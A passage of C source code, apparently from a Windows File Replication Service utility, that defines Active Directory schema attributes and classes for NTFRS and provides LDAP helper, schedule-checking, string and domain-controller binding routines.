    L"cn",                  L"Frs-Time-Last-Config-Change",
    L"adminDisplayName",    L"Frs-Time-Last-Config-Change",
    L"adminDescription",    L"Frs-Time-Last-Config-Change",
    L"lDAPDisplayName",     L"frsTimeLastConfigChange",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.01",
    L"oMSyntax",            L"23",
    L"attributeSyntax",     L"2.5.5.11",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsRootPath = {
    L"Frs-Root-Path",
    L"cn",                  L"Frs-Root-Path",
    L"adminDisplayName",    L"Frs-Root-Path",
    L"adminDescription",    L"Frs-Root-Path",
    L"lDAPDisplayName",     L"frsRootPath",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.02",
    L"oMSyntax",            L"64",
    L"attributeSyntax",     L"2.5.5.12",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"rangeLower",          L"0",
    L"rangeUpper",          L"512",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsComputerReference = {
    L"Frs-Computer-Reference",
    L"cn",                  L"Frs-Computer-Reference",
    L"adminDisplayName",    L"Frs-Computer-Reference",
    L"adminDescription",    L"Frs-Computer-Reference",
    L"lDAPDisplayName",     L"frsComputerReference",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.03",
    L"oMSyntax",            L"127",
    L"attributeSyntax",     L"2.5.5.1",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"systemFlags",         L"2",
    L"linkID",              L"100",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsComputerReferenceBl = {
    L"Frs-Computer-Reference-BL",
    L"cn",                  L"Frs-Computer-Reference-BL",
    L"adminDisplayName",    L"Frs-Computer-Reference-BL",
    L"adminDescription",    L"Frs-Computer-Reference-BL",
    L"lDAPDisplayName",     L"frsComputerReferenceBL",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.04",
    L"oMSyntax",            L"127",
    L"attributeSyntax",     L"2.5.5.1",
    L"isSingleValued",      L"FALSE",
    L"systemOnly",          L"FALSE",
    L"linkID",              L"101",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsMemberReference = {
    L"Frs-Member-Reference",
    L"cn",                  L"Frs-Member-Reference",
    L"adminDisplayName",    L"Frs-Member-Reference",
    L"adminDescription",    L"Frs-Member-Reference",
    L"lDAPDisplayName",     L"frsMemberReference",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.05",
    L"oMSyntax",            L"127",
    L"attributeSyntax",     L"2.5.5.1",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"systemFlags",         L"2",
    L"linkID",              L"102",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

struct AlterClass FrsMemberReferenceBl = {
    L"Frs-Member-Reference-BL",
    L"cn",                  L"Frs-Member-Reference-BL",
    L"adminDisplayName",    L"Frs-Member-Reference-BL",
    L"adminDescription",    L"Frs-Member-Reference-BL",
    L"lDAPDisplayName",     L"frsMemberReferenceBL",
    L"objectClass",         L"attributeSchema",
    L"attributeId",         L"1.2.840.113556.1.4.7001.06",
    L"oMSyntax",            L"127",
    L"attributeSyntax",     L"2.5.5.1",
    L"isSingleValued",      L"TRUE",
    L"systemOnly",          L"FALSE",
    L"linkID",              L"103",
    L"hideFromAB",          L"TRUE",
    NULL, NULL
};

//
// CLASSES
//
struct AlterClass NtFrsMember = {
    L"NTFRS-Member",
    L"cn",                    L"NTFRS-Member",
    L"adminDisplayName",      L"NTFRS-Member",
    L"adminDescription",      L"NTFRS-Member",
    L"lDAPDisplayName",       L"nTFRSMember",
    L"objectClass",           L"classSchema",
    L"rDNAttID",              L"cn",
    L"defaultHidingValue",    L"TRUE",
    L"hideFromAB",            L"TRUE",
    L"subClassOf",            L"leaf",
    L"systemOnly",            L"FALSE",
    L"governsId",             L"1.2.840.113556.1.4.7001.07",
    L"objectClassCategory",   L"1",
    NULL, NULL
};

struct AlterClass NtFrsSubscriptions = {
    L"NTFRS-Subscriptions",
    L"cn",                    L"NTFRS-Subscriptions",
    L"adminDisplayName",      L"NTFRS-Subscriptions",
    L"adminDescription",      L"NTFRS-Subscriptions",
    L"lDAPDisplayName",       L"nTFRSSubscriptions",
    L"objectClass",           L"classSchema",
    L"rDNAttID",              L"cn",
    L"defaultHidingValue",    L"TRUE",
    L"hideFromAB",            L"TRUE",
    L"subClassOf",            L"leaf",
    L"systemOnly",            L"FALSE",
    L"governsId",             L"1.2.840.113556.1.4.7001.08",
    L"objectClassCategory",   L"1",
    NULL, NULL
};

struct AlterClass NtFrsSubscriber = {
    L"NTFRS-Subscriber",
    L"cn",                    L"NTFRS-Subscriber",
    L"adminDisplayName",      L"NTFRS-Subscriber",
    L"adminDescription",      L"NTFRS-Subscriber",
    L"lDAPDisplayName",       L"nTFRSSubscriber",
    L"objectClass",           L"classSchema",
    L"rDNAttID",              L"cn",
    L"defaultHidingValue",    L"TRUE",
    L"hideFromAB",            L"TRUE",
    L"subClassOf",            L"leaf",
    L"systemOnly",            L"FALSE",
    L"governsId",             L"1.2.840.113556.1.4.7001.09",
    L"objectClassCategory",   L"1",
    NULL, NULL
};

struct AlterClass NtFrsMemberEx = {
    L"NTFRS-Member",
    L"possSuperiors",         L"nTFRSReplicaSet",
    L"mayContain",            L"frsExtensions",
    L"mayContain",            L"frsPartnerAuthLevel",
    L"mayContain",            L"frsRootSecurity",
    L"mayContain",            L"frsServiceCommand",
    L"mayContain",            L"schedule",
    L"mayContain",            L"frsComputerReference",
    L"mayContain",            L"ServerReference",
    L"mayContain",            L"frsMemberReferenceBL",
    L"mayContain",            L"frsUpdateTimeout",
    L"mayContain",            L"frsControlDataCreation",
    L"mayContain",            L"frsControlInboundBacklog",
    L"mayContain",            L"frsControlOutboundBacklog",
    L"mayContain",            L"frsFlags",
    NULL, NULL
};

struct AlterClass NtFrsSubscriptionsEx = {
    L"NTFRS-Subscriptions",
    L"possSuperiors",         L"computer",
    L"possSuperiors",         L"nTFRSSubscriptions",
    L"mayContain",            L"frsWorkingPath",
    L"mayContain",            L"frsVersion",
    L"mayContain",            L"frsExtensions",
    NULL, NULL
};

struct AlterClass NtFrsSubscriberEx = {
    L"NTFRS-Subscriber",
    L"possSuperiors",         L"nTFRSSubscriptions",
    L"mustContain",           L"frsRootPath",
    L"mustContain",           L"frsStagingPath",
    L"mayContain",            L"frsExtensions",
    L"mayContain",            L"frsFlags",
    L"mayContain",            L"frsFaultCondition",
    L"mayContain",            L"frsMemberReference",
    L"mayContain",            L"frsUpdateTimeout",
    L"mayContain",            L"frsServiceCommand",
    L"mayContain",            L"frsServiceCommandStatus",
    L"mayContain",            L"schedule",
    L"mayContain",            L"frsTimeLastCommand",
    L"mayContain",            L"frsTimeLastConfigChange",
    NULL, NULL
};

//
// CREATE ATTRIBUTES
//
struct AlterClass   *CreateAttributes[] = {
    &FrsExtensions,
    &FrsVersionGuid,
    &FrsReplicaSetGuid,
    &FrsDsPoll,
    &FrsReplicaSetType,
    &FrsDirectoryFilter,
    &FrsFileFilter,
    &FrsFlags,
    &FrsLevelLimit,
    &FrsPartnerAuthLevel,
    &FrsRootSecurity,
    &FrsServiceCommand,
    &FrsUpdateTimeout,
    &FrsWorkingPath,
    &FrsStagingPath,
    &FrsServiceCommandStatus,
    &FrsTimeLastCommand,
    &FrsTimeLastConfigChange,
    &FrsRootPath,
    &FrsComputerReference,
    &FrsComputerReferenceBl,
    &FrsMemberReference,
    &FrsMemberReferenceBl,
    &FrsControlDataCreation,
    &FrsControlInboundBacklog,
    &FrsControlOutboundBacklog,
    &FrsFaultCondition,
    &FrsVersion,
    &FrsPrimaryMember,
    NULL
};

//
// CREATE CLASSES
//
struct AlterClass   *CreateClasses[] = {
    &NtFrsMember,
    &NtFrsSubscriptions,
    &NtFrsSubscriber,
    NULL
};

//
// ALTER EXISTING CLASSES
//
struct AlterClass   *AlterSchema[] = {
    &Computer,
    &NtFrsSettings,
    &NtFrsReplicaSet,
    &NtDsConnection,
    &NtFrsMemberEx,
    &NtFrsSubscriptionsEx,
    &NtFrsSubscriberEx,
    NULL
};


PWCHAR
MakeRdn(
    IN PWCHAR DN
    )
/*++
Routine Description:
    Extract the base component (relative distinguished name) from a
    distinguished name. The distinguished name is assumed to be in
    DS format (CN=xyz,CN=next one,...). In this case, the returned
    RDN is "xyz".

Arguments:
    DN      - distinguished name

Return Value:
    A zero-terminated string. The string is freed with FREE_NO_HEADER().
--*/
{
    DWORD   RDNLen;
    PWCHAR  RDN;

    if (DN == NULL) {
        return NULL;
    }

    // Skip the first CN=; if any
    RDN = wcsstr(DN, L"CN=");
    if (RDN == DN)
        DN += 3;

    // Return the string up to the first delimiter or EOS
    RDNLen = wcscspn(DN, L",");
    RDN = (PWCHAR)malloc(sizeof(WCHAR) * (RDNLen + 1));
    wcsncpy(RDN, DN, RDNLen);
    RDN[RDNLen] = L'\0';

    return RDN;
}


PWCHAR
FrsDsMakeParentDn(
    IN PWCHAR Dn
    )
/*++
Routine Description:

Arguments:

Return Value:
--*/
{
    DWORD   PLen;

    if (Dn == NULL) {
        return NULL;
    }

    PLen = wcscspn(Dn, L",");
    if (Dn[PLen] != L',') {
        return NULL;
    }
    return FrsWcsDup(&Dn[PLen + 1]);
}



VOID
AddMod(
    IN PWCHAR AttrType,
    IN PWCHAR AttrValue,
    IN OUT LDAPMod ***pppMod
    )
/*++
Routine Description:
    Add an attribute (plus values) to a structure that will eventually be
    used in an ldap_add() function to add an object to the DS. The null-
    terminated array referenced by pppMod grows with each call to this
    routine. The array is freed by the caller using FreeMod().

Arguments:
    AttrType        - The object class of the object.
    AttrValue       - The value of the attribute.
    pppMod          - Address of an array of pointers to "attributes". Don't
                      give me that look -- this is an LDAP thing.

Return Value:
    The pppMod array grows by one entry. The caller must free it with
    FreeMod().
--*/
{
    DWORD   NumMod;     // Number of entries in the Mod array
    LDAPMod **ppMod;    // Address of the first entry in the Mod array
    LDAPMod *Attr;      // An attribute structure
    PWCHAR   *Values;    // An array of pointers to bervals

    if (AttrValue == NULL)
        return;

    //
    // The null-terminated array doesn't exist; create it
    //
    if (*pppMod == NULL) {
        *pppMod = (LDAPMod **)malloc(sizeof (*pppMod));
        **pppMod = NULL;
    }

    //
    // Increase the array's size by 1
    //
    for (ppMod = *pppMod, NumMod = 2; *ppMod != NULL; ++ppMod, ++NumMod);
    *pppMod = (LDAPMod **)realloc(*pppMod, sizeof (*pppMod) * NumMod);

    //
    // Add the new attribute + value to the Mod array
    //
    Values = (PWCHAR *)malloc(sizeof (PWCHAR) * 2);
    Values[0] = _wcsdup(AttrValue);
    Values[1] = NULL;

    Attr = (LDAPMod *)malloc(sizeof (*Attr));
    Attr->mod_values = Values;
    Attr->mod_type = _wcsdup(AttrType);
    Attr->mod_op = LDAP_MOD_ADD;

    (*pppMod)[NumMod - 1] = NULL;
    (*pppMod)[NumMod - 2] = Attr;
}


VOID
AddBerMod(
    IN PWCHAR AttrType,
    IN PCHAR AttrValue,
    IN DWORD AttrValueLen,
    IN OUT LDAPMod ***pppMod
    )
/*++
Routine Description:
    Add an attribute (plus values) to a structure that will eventually be
    used in an ldap_add() function to add an object to the DS. The null-
    terminated array referenced by pppMod grows with each call to this
    routine. The array is freed by the caller using FreeMod().

Arguments:
    AttrType        - The object class of the object.
    AttrValue       - The value of the attribute.
    AttrValueLen    - length of the attribute
    pppMod          - Address of an array of pointers to "attributes". Don't
                      give me that look -- this is an LDAP thing.

Return Value:
    The pppMod array grows by one entry. The caller must free it with
    FreeMod().
--*/
{
    DWORD   NumMod;     // Number of entries in the Mod array
    LDAPMod **ppMod;    // Address of the first entry in the Mod array
    LDAPMod *Attr;      // An attribute structure
    PLDAP_BERVAL    Berval;
    PLDAP_BERVAL    *Values;    // An array of pointers to bervals

    if (AttrValue == NULL)
        return;

    //
    // The null-terminated array doesn't exist; create it
    //
    if (*pppMod == NULL) {
        *pppMod = (LDAPMod **)malloc(sizeof (*pppMod));
        **pppMod = NULL;
    }

    //
    // Increase the array's size by 1
    //
    for (ppMod = *pppMod, NumMod = 2; *ppMod != NULL; ++ppMod, ++NumMod);
    *pppMod = (LDAPMod **)realloc(*pppMod, sizeof (*pppMod) * NumMod);

    //
    // Construct a berval
    //
    Berval = (PLDAP_BERVAL)malloc(sizeof(LDAP_BERVAL));
    Berval->bv_len = AttrValueLen;
    Berval->bv_val = (PCHAR)malloc(AttrValueLen);
    CopyMemory(Berval->bv_val, AttrValue, AttrValueLen);

    //
    // Add the new attribute + value to the Mod array
    //
    Values = (PLDAP_BERVAL *)malloc(sizeof (PLDAP_BERVAL) * 2);
    Values[0] = Berval;
    Values[1] = NULL;

    Attr = (LDAPMod *)malloc(sizeof (*Attr));
    Attr->mod_bvalues = Values;
    Attr->mod_type = _wcsdup(AttrType);
    Attr->mod_op = LDAP_MOD_BVALUES | LDAP_MOD_REPLACE;

    (*pppMod)[NumMod - 1] = NULL;
    (*pppMod)[NumMod - 2] = Attr;
}


VOID
FreeMod(
    IN OUT LDAPMod ***pppMod
    )
/*++
Routine Description:
    Free the structure built by successive calls to AddMod().

Arguments:
    pppMod  - Address of a null-terminated array.

Return Value:
    *pppMod set to NULL.
--*/
{
    DWORD   i, j;
    LDAPMod **ppMod;

    if (!pppMod || !*pppMod) {
        return;
    }

    //
    // For each attibute
    //
    ppMod = *pppMod;
    for (i = 0; ppMod[i] != NULL; ++i) {
        //
        // For each value of the attribute
        //
        for (j = 0; (ppMod[i])->mod_values[j] != NULL; ++j) {
            //
            // Free the value
            //
            if (ppMod[i]->mod_op & LDAP_MOD_BVALUES) {
                free(ppMod[i]->mod_bvalues[j]->bv_val);
            }
            free((ppMod[i])->mod_values[j]);
        }
        free((ppMod[i])->mod_values);   // Free the array of pointers to values
        free((ppMod[i])->mod_type);     // Free the string identifying the attribute
        free(ppMod[i]);                 // Free the attribute
    }
    free(ppMod);        // Free the array of pointers to attributes
    *pppMod = NULL;     // Now ready for more calls to AddMod()
}


BOOL
LdapSearch(
    IN PLDAP        ldap,
    IN PWCHAR       Base,
    IN ULONG        Scope,
    IN PWCHAR       Filter,
    IN PWCHAR       Attrs[],
    IN ULONG        AttrsOnly,
    IN LDAPMessage  **Res,
    IN BOOL         Quiet
    )
/*++
Routine Description:
    Issue the ldap ldap_search_s call, check for errors, and check for
    a shutdown in progress.

Arguments:
    ldap
    Base
    Scope
    Filter
    Attrs
    AttrsOnly
    Res

Return Value:
    The ldap array of values or NULL if the Base, DesiredAttr, or its values
    does not exist. The ldap array is freed with ldap_value_free().
--*/
{
    DWORD LStatus;

    //
    // Issue the ldap search
    //
    LStatus = ldap_search_s(ldap, Base, Scope, Filter, Attrs, AttrsOnly, Res);
    //
    // Check for errors
    //
    if (LStatus != LDAP_SUCCESS) {
        if (!Quiet) {
            fprintf(stderr, "WARN - Error searching %ws for %ws; LStatus %d: %ws\n",
                    Base, Filter, LStatus, ldap_err2string(LStatus));
        }
        return FALSE;
    }
    //
    // Return TRUE if not shutting down
    //
    return TRUE;
}


BOOL
FrsDsVerifySchedule(
    IN PWCHAR    Name,
    IN ULONG     ScheduleLength,
    IN PSCHEDULE Schedule
    )
/*++
Routine Description:
    Check the schedule for consistency

Arguments:
    Name
    Schedule

Return Value:
    None.
--*/
{
    ULONG       i, j;
    ULONG       Num;
    ULONG       Len;
    ULONG       NumType;
    PUCHAR      NewScheduleData;
    PUCHAR      OldScheduleData;

    if (!Schedule) {
        return TRUE;
    }

    //
    //  Too many schedules
    //
    Num = Schedule->NumberOfSchedules;
    if (Num > 3) {
        fprintf(stderr, "%ws has %d schedules\n", Name, Num);
        return FALSE;
    }

    //
    //  Too few schedules
    //
    if (Num < 1) {
        fprintf(stderr, "%ws has %d schedules\n", Name, Num);
        return FALSE;
    }

    //
    //  Not enough memory
    //
    Len = sizeof(SCHEDULE) +
          (sizeof(SCHEDULE_HEADER) * (Num - 1)) +
          (SCHEDULE_DATA_BYTES * Num);

    if (ScheduleLength < Len) {
        fprintf(stderr, "%ws is short (ds) by %d bytes (%d - %d), %d\n",
                Name,
                Len - ScheduleLength,
                Len,
                ScheduleLength,
                Schedule->Size);
        return FALSE;
    }

    if (Schedule->Size < Len) {
        fprintf(stderr, "%ws is short (size) by %d bytes (%d - %d), %d\n",
                Name,
                Len - Schedule->Size,
                Len,
                Schedule->Size,
                Schedule->Size);
        return FALSE;
    }
    Schedule->Size = Len;

    //
    //  Invalid type
    //
    for (i = 0; i < Num; ++i) {
        switch (Schedule->Schedules[i].Type) {
            case SCHEDULE_INTERVAL:
                break;
            case SCHEDULE_BANDWIDTH:
                break;
            case SCHEDULE_PRIORITY:
                break;
            default:
                fprintf(stderr, "%ws has an invalid schedule type (%d)\n",
                        Name,
                        Schedule->Schedules[i].Type);
                return FALSE;
        }
    }

    //
    // Only 0 or 1 interval
    //
    for (NumType = i = 0; i < Num; ++i)
        if (Schedule->Schedules[i].Type == SCHEDULE_INTERVAL)
            ++NumType;
    if (NumType > 1) {
        fprintf(stderr, "%ws has %d interval schedules\n",
                Name,
                NumType);
        return FALSE;
    }

    //
    // Only 0 or 1 bandwidth
    //
    for (NumType = i = 0; i < Num; ++i)
        if (Schedule->Schedules[i].Type == SCHEDULE_BANDWIDTH)
            ++NumType;
    if (NumType > 1) {
        fprintf(stderr, "%ws has %d bandwidth schedules\n",
                Name,
                NumType);
        return FALSE;
    }

    //
    // Only 0 or 1 priority
    //
    for (NumType = i = 0; i < Num; ++i)
        if (Schedule->Schedules[i].Type == SCHEDULE_PRIORITY)
            ++NumType;
    if (NumType > 1) {
        fprintf(stderr, "%ws has %d priority schedules\n",
                Name,
                NumType);
        return FALSE;
    }

    //
    //  Invalid offset
    //
    for (i = 0; i < Num; ++i) {
        if (Schedule->Schedules[i].Offset >
            ScheduleLength - SCHEDULE_DATA_BYTES) {
            fprintf(stderr, "%ws has an invalid offset (%d)\n",
                    Name,
                    Schedule->Schedules[i].Offset);
            return FALSE;
        }
    }
    return TRUE;
}


VOID
PrintShortSchedule(
    IN PWCHAR    Indent,
    IN PSCHEDULE Schedule,
    IN ULONG     ScheduleLen
    )
/*++
Routine Description:
    Print a short form of the schedule

Arguments:

Return Value:
    None.
--*/
{
    ULONG       i;

    if (!FrsDsVerifySchedule(L"<unknown>", ScheduleLen, Schedule)) {
        return;
    }

    if (!Schedule || !Schedule->NumberOfSchedules) {
        printf("%wsSchedule=\n", Indent);
        return;
    }

    for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
        if (!i) {
            printf("%wsSchedule=Type %d", Indent, Schedule->Schedules[i].Type);
        } else {
            printf(", %d", Schedule->Schedules[i].Type);
        }
    }
    printf("\n");
}


VOID
PrintLongSchedule(
    IN PWCHAR    Indent1,
    IN PWCHAR    Indent2,
    IN PSCHEDULE Schedule,
    IN ULONG     ScheduleLen
    )
/*++
Routine Description:
    Print a short form of the schedule

Arguments:

Return Value:
    None.
--*/
{
    ULONG   i;
    ULONG   Day;
    ULONG   Hour;
    BOOL    PrintIt;
    PUCHAR  ScheduleData;

    if (!FrsDsVerifySchedule(L"<unknown>", ScheduleLen, Schedule)) {
        return;
    }

    if (!Schedule || !Schedule->NumberOfSchedules) {
        printf("%ws%wsSchedule=\n", Indent1, Indent2);
        return;
    }
    for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
        if (!i) {
            printf("%ws%wsSchedule=Type %d",
                   Indent1,
                   Indent2,
                   Schedule->Schedules[i].Type);
        } else {
            printf(", %d", Schedule->Schedules[i].Type);
        }
    }
    printf("\n");

    for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
        ScheduleData = ((PUCHAR)Schedule) + Schedule->Schedules[i].Offset;
        if (Schedule->Schedules[i].Type != SCHEDULE_INTERVAL) {
            continue;
        }
        for (Day = 0; Day < 7; ++Day) {
            if (Day) {
                PrintIt = FALSE;
                for (Hour = 0; Hour < 24; ++Hour) {
                    if (*(ScheduleData + (Day * 24) + Hour) !=
                        *(ScheduleData + ((Day - 1) * 24) + Hour)) {
                        PrintIt = TRUE;
                        break;
                    }
                }
            } else {
                PrintIt = TRUE;
            }
            if (!PrintIt) {
                continue;
            }
            printf("%ws%ws   Day %1d: ", Indent1, Indent2, Day + 1);
            for (Hour = 0; Hour < 24; ++Hour) {
                printf("%1x", *(ScheduleData + (Day * 24) + Hour) & 0x0F);
            }
            printf("\n");
        }
        printf("\n");
    }
}


VOID
PrintSchedule(
    IN PSCHEDULE Schedule
    )
/*++
Routine Description:
    Print the schedule

Arguments:
    Schedule

Return Value:
    None.
--*/
{
    ULONG       i;

    if (Schedule) for (i = 0; i < Schedule->NumberOfSchedules; ++i) {
        printf("    Schedule %d\n", i);
        printf("        Type  : %d\n", Schedule->Schedules[i].Type);
        printf("        Offset: %d\n", Schedule->Schedules[i].Offset);
    }
}


PCHAR
FrsWtoA(
    PWCHAR Wstr
    )
/*++
Routine Description:
    Translate a wide char string into a newly allocated char string.

Arguments:
    Wstr - wide char string

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
    PCHAR   Astr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (Wstr == NULL)
        return NULL;

    Astr = (PCHAR)malloc(wcslen(Wstr) + 1);
    sprintf(Astr, "%ws", Wstr);

    return Astr;
}


PWCHAR
FrsAtoW(
    PCHAR Astr
    )
/*++
Routine Description:
    Translate a wide char string into a newly allocated char string.

Arguments:
    Wstr - wide char string

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
    PWCHAR   Wstr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (Astr == NULL) {
        return NULL;
    }

    Wstr = (PWCHAR)malloc((strlen(Astr) + 1) * sizeof(WCHAR));
    swprintf(Wstr, L"%hs", Astr);

    return Wstr;
}


PWCHAR
FrsWcsDup(
    PWCHAR OldStr
    )
/*++
Routine Description:
    Duplicate a string using our memory allocater

Arguments:
    OldArg  - string to duplicate

Return Value:
    Duplicated string. Free with FrsFree().
--*/
{
    PWCHAR  NewStr;

    //
    // E.g., when duplicating NodePartner when none exists
    //
    if (OldStr == NULL)
            return NULL;

    NewStr = (PWCHAR)malloc((wcslen(OldStr) + 1) * sizeof(WCHAR));
    wcscpy(NewStr, OldStr);

    return NewStr;
}


PWCHAR
FrsWcsCat(
    PWCHAR First,
    PWCHAR Second
    )
/*++
Routine Description:
    Concatenate two strings into a new string using our memory allocater

Arguments:
    First   - First string in the concat
    Second  - Second string in the concat

Return Value:
    Duplicated and concatentated string. Free with FrsFree().
--*/
{
    DWORD   Bytes;
    PWCHAR  New;

    // size of new string
    Bytes = (wcslen(First) + wcslen(Second) + 1) * sizeof(WCHAR);
    New = (PWCHAR)malloc(Bytes);

    // Not as efficient as I would like but this routine is seldom used
    wcscpy(New, First);
    wcscat(New, Second);

    return New;
}


ULONG NumSchedules;
VOID
ConditionalBuildSchedule(
    PSCHEDULE   *Schedule,
    PULONG      ScheduleLength
    )

/*++
Routine Description:
    Build a schedule with the specified number of schedules

Arguments:
    Schedule
    ScheduleLength

Return Value:
    Schedule or NULL. Free with free();
--*/
{
    PBYTE   ScheduleData;
    ULONG   j;

    //
    // No schedule, yet
    //
    *Schedule = NULL;
    *ScheduleLength = 0;

    //
    // Create variable sized schedules
    //
    ++NumSchedules;
    if (NumSchedules > 3) {
        NumSchedules = 1;   // shouldn't always create schedule
    }
    if (NumSchedules == 0) {
        return;
    }

    //
    // Construct a phoney schedule; always "on"
    //
    *ScheduleLength = sizeof(SCHEDULE) +
                      ((NumSchedules - 1) * sizeof(SCHEDULE_HEADER)) +
                      (NumSchedules * SCHEDULE_DATA_BYTES);

    *Schedule = (PSCHEDULE)malloc(*ScheduleLength);
    ZeroMemory(*Schedule, *ScheduleLength);
    (*Schedule)->Size = *ScheduleLength;
    (*Schedule)->NumberOfSchedules = NumSchedules;
    (*Schedule)->Schedules[0].Type = SCHEDULE_INTERVAL;
    (*Schedule)->Schedules[0].Offset = sizeof(SCHEDULE) +
                                       ((NumSchedules - 1) * sizeof(SCHEDULE_HEADER)) +
                                       (0 * SCHEDULE_DATA_BYTES);
    if (NumSchedules == 1) {
        goto setschedule;
    }
    (*Schedule)->Schedules[1].Type = SCHEDULE_PRIORITY;
    (*Schedule)->Schedules[1].Offset = sizeof(SCHEDULE) +
                                       ((NumSchedules - 1) * sizeof(SCHEDULE_HEADER)) +
                                       (1 * SCHEDULE_DATA_BYTES);
    if (NumSchedules == 2) {
        goto setschedule;
    }
    (*Schedule)->Schedules[2].Type = SCHEDULE_BANDWIDTH;
    (*Schedule)->Schedules[2].Offset = sizeof(SCHEDULE) +
                                       ((NumSchedules - 1) * sizeof(SCHEDULE_HEADER)) +
                                       (2 * SCHEDULE_DATA_BYTES);
    if (NumSchedules == 3) {
        goto setschedule;
    }

setschedule:
    ScheduleData = ((PBYTE)(*Schedule));
    for (j = 0; j < (SCHEDULE_DATA_BYTES * NumSchedules); ++j) {
        *(ScheduleData + (*Schedule)->Schedules[0].Offset + j) = 0xff;
    }
}


DWORD
FrsDsGetDcInfo(
    IN PDOMAIN_CONTROLLER_INFO *DcInfo,
    IN DWORD Flags
    )
/*++
Routine Description:
    Open and bind to a dc

Arguments:
    DcInfo  - Dc Info
    Flags   - DsGetDcName(Flags)

Return Value:
    DsGetDcName
--*/
{
    DWORD   WStatus;

    WStatus = DsGetDcName(NULL,    // Computer to remote to
                          NULL,    // Domain - use our own
                          NULL,    // Domain Guid
                          NULL,    // Site Guid
                          Flags,
                          DcInfo); // Return info
    //
    // Report the error and retry for any DC
    //
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR - Could not get DC Info; WStatus %d\n", WStatus);
        return WStatus;
    }
    printf("DCINFO for %08x:\n", Flags);
    printf("\tDomainControllerName   : %ws\n", (*DcInfo)->DomainControllerName);
    printf("\tDomainControllerAddress: %ws\n", (*DcInfo)->DomainControllerAddress);
    printf("\tDomainControllerType   : %08x\n",(*DcInfo)->DomainControllerAddressType);
    printf("\tDomainName             : %ws\n", (*DcInfo)->DomainName);
    // printf("\tForestName             : %ws\n", (*DcInfo)->DnsForestName);
    printf("\tDcSiteName             : %ws\n", (*DcInfo)->DcSiteName);
    printf("\tClientSiteName         : %ws\n", (*DcInfo)->ClientSiteName);
    printf("\tFlags                  : %08x\n",(*DcInfo)->Flags);
    return WStatus;
}


PLDAP
FrsDsOpenDs(
    VOID
    )
/*++
Routine Description:
    Open and bind to the a primary domain controller.

Arguments:
    None.

Return Value:
    The address of a open, bound LDAP port or NULL if the operation was
    unsuccessful. The caller must free the structure with ldap_unbind().
--*/
{
    DWORD WStatus;
    PLDAP ldap = NULL;    // ldap handle
    PWCHAR DcAddr;
    PWCHAR DcDnsName;
    PDOMAIN_CONTROLLER_INFO DcInfo;
    ULONG  ulOptions;

    //
    // Get Info about a Global Catalogue
    // Domain Controller (need the IP address)
    //
    // (Nope; try to live without it, Billy)
    //
    bugbug("FORCE_REDISCOVERY was removed per Herron")
    WStatus = FrsDsGetDcInfo(&DcInfo,
                          DS_DIRECTORY_SERVICE_REQUIRED | // Flags
                          DS_WRITABLE_REQUIRED);
    //
    // Report the error and retry for any DC
    //
    if (!WIN_SUCCESS(WStatus)) {
        printf("Retrying FrsDsGetDcInfo with force rediscovery\n");
        FrsDsGetDcInfo(&DcInfo,
                    DS_DIRECTORY_SERVICE_REQUIRED | // Flags
                    DS_WRITABLE_REQUIRED |
                    DS_FORCE_REDISCOVERY);
    }
    if (!WIN_SUCCESS(WStatus)) {
        fprintf(stderr, "ERROR - Could not get DC Info; WStatus %d\n", WStatus);
    }
    DcAddr = DcInfo->DomainControllerAddress;
    DcDnsName = DcInfo->DomainControllerName;

    //
    // if ldap_open is called with a server name the api will call DsGetDcName 
    // passing the server name as the domainname parm...bad, because 
    // DsGetDcName will make a load of DNS queries based on the server name, 
    // it is designed to construct these queries from a domain name...so all 
    // these queries will be bogus, meaning they will waste network bandwidth,
    // time to fail, and worst case cause expensive on demand links to come up 
    // as referrals/forwarders are contacted to attempt to resolve the bogus 
    // names.  By setting LDAP_OPT_AREC_EXCLUSIVE to on using ldap_set_option 
    // after the ldap_init but before any other operation using the ldap 
    // handle from ldap_init, the delayed connection setup will not call 
    // DsGetDcName, just gethostbyname, or if an IP is passed, the ldap client 
    // will detect that and use the address directly.
    //

    //
    // DC's DNS name (w/o the leading \\)
    //
    if (!ldap &&
        DcDnsName &&
        (wcslen(DcDnsName) > 2) &&
        DcDnsName[0] == L'\\' &&
        DcDnsName[1] == L'\\') {
//        ldap = ldap_open(DcDnsName + 2, LDAP_PORT);
        ldap = ldap_init(DcDnsName + 2, LDAP_PORT);
        if (!ldap) {
//            fprintf(stderr, "WARN - ldap_open(DcDnsName + 2 %ws); WStatus %d\n",
//                    DcDnsName + 2,
//                    WStatus);
            fprintf(stderr, "WARN - ldap_init(DcDnsName + 2 %ws); WStatus %d\n",
                    DcDnsName + 2,
                    WStatus);
        } else {
//            printf("ldap_open(DcDnsName + 2 %ws) succeeded\n", DcDnsName + 2);
            printf("ldap_init(DcDnsName + 2 %ws) succeeded\n", DcDnsName + 2);
        }
    }

    //
    // DC's IP Address (w/o the leading \\)
    //
    if (!ldap &&
        DcAddr &&
        (wcslen(DcAddr) > 2) &&
        DcAddr[0] == L'\\' &&
        DcAddr[1] == L'\\') {
//        ldap = ldap_open(DcAddr + 2, LDAP_PORT);
